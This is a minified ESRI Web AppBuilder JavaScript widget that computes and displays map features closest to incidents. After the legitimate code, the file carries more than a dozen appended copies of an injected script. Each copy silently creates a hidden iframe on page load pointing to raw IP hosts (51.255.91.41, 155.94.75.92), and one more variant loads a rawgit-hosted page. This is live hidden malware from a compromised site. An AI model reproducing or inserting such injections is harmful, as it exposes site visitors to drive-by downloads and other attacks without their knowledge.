// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/Color dojo/_base/array dojo/DeferredList dojo/Deferred dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/dom-style dojo/on jimu/utils esri/geometry/geometryEngine esri/graphic esri/Color esri/layers/FeatureLayer esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/Font esri/symbols/TextSymbol esri/tasks/query ./analysisUtils".split(" "),function(N,p,H,O,I,D,q,x,P,J,C,Q,K,F,R,y,L,M,S,T,U,u){return N("ClosestInfo",null,
{featureCount:0,mapServiceLayer:!1,loading:!1,queryOnLoad:!1,incidentCount:0,constructor:function(a,b,d){this.tab=a;this.container=b;this.parent=d;this.graphicsLayer=this.incident=null;this.map=d.map;this.specialFields={};this.typeIdField="";this.types=[];this.dateFields={};this.config=d.config;this.baseLabel=""!==a.label?a.label:a.layerTitle?a.layerTitle:a.layers},queryTabCount:function(a,b,d,e){var l=new D;this.incidentCount=a.length;var f=this.parent.config.distanceSettings[this.parent.config.distanceUnits],
m=this.parent.config.maxDistance;b=[];for(var c=0;c<a.length;c++)b.push(K.buffer(a[c].geometry,m,f));var h=[this.tab.tabLayers[0]];this.mapServiceLayer&&1<this.tab.tabLayers.length&&(h=[this.tab.tabLayers[1]]);if(0<this.tab.tabLayers.length&&this.tab.tabLayers[0].url&&-1<this.tab.tabLayers[0].url.indexOf("MapServer")){this.mapServiceLayer=!0;var k;"undefined"!==typeof this.tab.tabLayers[0].infoTemplate?(this.summaryLayer=this.tab.tabLayers[0],this.summaryLayer.hasOwnProperty("loaded")&&this.summaryLayer.loaded?
(this.summaryFields=this._getFields(this.summaryLayer),this._performQuery(a,b,d,e,h).then(function(a){l.resolve(a)})):(k=new y(this.summaryLayer.url),k.infoTemplate=this.tab.tabLayers[0].infoTemplate,h=[k],this.tab.tabLayers=h,C(k,"load",p.hitch(this,function(){this.summaryLayer=k;this.summaryFields=this._getFields(this.summaryLayer);this._performQuery(a,b,d,e,h).then(function(a){l.resolve(a)})})))):this.loading||(k=new y(this.tab.tabLayers[0].url),this.loading=!0,C(k,"load",p.hitch(this,function(){this.summaryLayer=
k;this.summaryFields=this._getFields(this.summaryLayer);for(var g=this.tab.tabLayers[0].url.split("MapServer/")[1],f=this.parent.map.itemInfo.itemData.operationalLayers,t=0;t<f.length;t++){var c=f[t];if("undefined"!==typeof c.layerObject&&c.layerObject.infoTemplates&&(c=c.layerObject.infoTemplates[g])){k.infoTemplate=c.infoTemplate;break}}h=[k];this.tab.tabLayers=h;this.loading=!1;this._performQuery(a,b,d,e,h).then(function(a){l.resolve(a)})})))}this.mapServiceLayer||this._performQuery(a,b,d,e,h).then(function(a){l.resolve(a)});
return l},_performQuery:function(a,b,d,e,l){var f=new D,m=[],c,h;this.summaryGeoms=b;if(0<b.length)for(a=0;a<b.length;a++)m=b[a],h=u.createDefArray(l,m),c=0===a?m=h:m=c.concat(h);(new I(m)).then(p.hitch(this,function(a){for(var g=0,b=0;b<a.length;b++){var c=a[b][1];isNaN(c)?c&&c.features?0<c.features.length&&(g+=1):c&&"undefined"!==typeof c.length&&0<c.length&&(g+=1):0<c&&(g+=1)}this.updateTabCount(g,d,e);f.resolve(g)}));return f},updateTabCount:function(a,b,d){this.featureCount=0===parseInt(a,10)?
0:a;u.updateTabCount(this.featureCount,b,d,this.baseLabel,this.incidentCount)},updateForIncident:function(a,b,d,e,l,f){this.incidentCount=a.length;this.allFields="undefined"!==typeof l&&"undefined"!==typeof f?l?!0:f:!1;var m="undefined"!==typeof e,c;O.forEach(this.tab.tabLayers,p.hitch(this,function(f){m&&(c=new D);if(f.url){var h=new y(f.url,{mode:y.MODE_ONDEMAND,infoTemplate:f.infoTemplate});C(h,"load",p.hitch(this,function(){this.tab.tabLayers=[h];m?this.processIncident(a,b,d,e).then(p.hitch(this,
function(a){c.resolve(a)}),p.hitch(this,function(a){console.error(a);c.reject(a)})):this.processIncident(a,b,d,e)}))}else m?this.processIncident(a,b,d,e).then(p.hitch(this,function(a){c.resolve(a)}),p.hitch(this,function(a){console.error(a);c.reject(a)})):this.processIncident(a,b,d,e)}));if(m)return c},processIncident:function(a,b,d,e){this.incidents=a;var l,f="undefined"!==typeof e;f?l=new D:(this.container.innerHTML="",q.add(this.container,"loading"));var m=[];e=this.parent.config.distanceSettings[this.parent.config.distanceUnits];
for(var c=[],h=0;h<a.length;h++){var k=a[h].geometry,g=K.buffer(k,b,e);c.push({geometry:k,buffer:g})}(this.graphicsLayer=d)&&this.graphicsLayer.clear();a=[];b=this.tab.tabLayers[0];var r=this._getFields(b);for(d=0;d<c.length;d++)e=new U,e.returnGeometry=!0,e.outSpatialReference=this.parent.map.spatialReference,e.geometry=c[d].buffer,e.outFields="true"===this.parent.config.csvAllFields||!0===this.parent.config.csvAllFields?["*"]:r,"undefined"!==typeof b.queryFeatures&&a.push(b.queryFeatures(e));(new I(a)).then(p.hitch(this,
function(a){for(var b=0;b<a.length;b++)if(a[b][0]){var d=a[b][1].features,e=[],h=c[b].geometry;if(d&&0<d.length){for(var g=0;g<d.length;g++){for(var k=new F(d[g].toJson()),q=u.getDistance(h,k.geometry,this.parent.config.distanceUnits),n={DISTANCE:q},t=0;t<r.length;t++)n[r[t]]=k.attributes[r[t]];!0===this.config.csvAllFields||"true"===this.config.csvAllFields?k.attributes.DISTANCE=q:k.attributes=n;e.push(k)}e.sort(u.compareDistance);m.push(e[0])}}else a[b][1]&&a[b][1].message&&console.log(a[b][1].message);
m.sort(u.compareDistance);f?this._processResults(m,!0).then(p.hitch(this,function(a){l.resolve(a)})):this._processResults(m)}),p.hitch(this,function(a){console.error(a);l.reject(a)}));if(f)return l},_processResults:function(a,b){var d,e,l=a&&0<a.length;if(l&&"point"!==a[0].geometry.type)for(var f=a.length-1;0<=f;f--)"undefined"===typeof a[f].geometry.getExtent()&&a.splice(f,1);b?d=new D:(this.container.innerHTML="",q.remove(this.container,"loading"),l&&(e=x.create("div",{"class":"SAT_tabPanelContent"},
this.container),f=x.create("div",{},e),q.add(f,"SATcolExport"),q.add(f,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder"),f=x.create("div",{title:this.parent.nls.downloadCSV},f),q.add(f,"btnExport"),C(f,"click",p.hitch(this,this._exportToCSV,a))));var f=this.parent.nls[this.parent.config.distanceUnits],m=[],c=220;if(l)for(var h=0;h<a.length;h++){var k=h+1,g=a[h],r=g.geometry,t=r;"point"!==r.type&&(t=r.getExtent().getCenter());var r=g.attributes,y;"point"===this.incidents[0].geometry.type&&
(y=Math.round(100*r.DISTANCE)/100+" "+f+" ("+this.parent.nls.approximate+")");var z="",w=0,A=[];if("undefined"!==typeof this.displayFields)for(var G=0;G<this.displayFields.length;G++){var v=this.displayFields[G],B;a:for(B in r)if("DISTANCE"!==B&&3>w&&v.expression===B){var n=u.getFieldValue(B,r[B],this.specialFields,this.dateFields,"longMonthDayYear",this.typeIdField,this.types),n="undefined"!==typeof n&&null!==n?Q.stripHTML(n.toString()):"",v="undefined"!==typeof v.label?v.label:void 0,E=g._layer&&
g._layer.fields?g._layer.fields:this.tab.tabLayers&&this.tab.tabLayers[0]?this.tab.tabLayers[0].fields:void 0;E&&(E=u.getField(E,B))&&(v=E.alias);if("undefined"===typeof v||v in[""," ",null,void 0])v=B;u.isURL(n)?n='\x3ca href\x3d"'+n+'" target\x3d"_blank" style\x3d"color: inherit;"\x3e'+v+"\x3c/a\x3e":u.isEmail(n)&&(n='\x3ca href\x3d"mailto:'+n+'" style\x3d"color: inherit;"\x3e'+v+"\x3c/a\x3e");z+=n+"\x3cbr/\x3e";w+=1;A.push({value:-1<n.indexOf(",")?n.replace(",",""):n,label:v});break a}}m.push(A);
b||(g=x.create("div",{},e),q.add(g,"SATcolRec"),q.add(g,this.parent.lightTheme?"lightThemeBorder":"darkThemeBorder"),w=x.create("div",{},g),q.add(w,"SATcolRecBar"),A=x.create("div",{innerHTML:k},w),q.add(A,"SATcolRecNum"),J.set(A,"backgroundColor",this.parent.config.activeColor),C(A,"click",p.hitch(this,this._zoomToLocation,t)),y&&(A=x.create("div",{innerHTML:y},w),q.add(A,"SATcolDistance")),this.parent.config.enableRouting&&(w=x.create("div",{title:this.parent.nls.get_directions},w),q.add(w,"SATcolDir"),
C(w,"click",p.hitch(this,this._routeToIncident,t))),z=x.create("div",{"class":"SATcolWrap",innerHTML:z},g),q.add(z,"SATcolInfo"),c+=P.position(g).w,z=new M(M.STYLE_SOLID,new H.fromRgb(this.parent.config.activeMapGraphicColor),1),z=new L(L.STYLE_CIRCLE,24,z,new H.fromRgb(this.parent.config.activeMapGraphicColor)),g=new S,g.family="Arial",g.size="12px",k=new T(k,g,new R(this.parent.config.fontColor)),k.setOffset(0,-4),this.graphicsLayer.add(new F(t,z,r)),this.graphicsLayer.add(new F(t,k,r)))}if(!b&&
l)J.set(e,"width",c);else if(l)return d.resolve({graphics:a,analysisResults:m,context:this}),d},_exportToCSV:function(a,b,d,e){a=u.exportToCSV(a,b,d,e,{type:"closest",baseLabel:this.baseLabel,csvAllFields:this.parent.config.csvAllFields,layer:this.tab.tabLayers[0],opLayers:this.parent.opLayers,nlsValue:this.parent.nls.closest,nlsCount:this.parent.nls.count});this.summaryLayer=a.summaryLayer;return a.details},_getFields:function(a){a=u.getFields(a,this.tab,this.allFields,this.parent);this.dateFields=
a.dateFields;this.specialFields=a.specialFields;this.typeIdField=a.typeIdField;this.types=a.types;this.displayFields=u.getDisplayFields(this.tab);return a.fields},_zoomToLocation:function(a){this.parent.zoomToLocation(a)},_routeToIncident:function(a){this.parent.routeToIncident(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});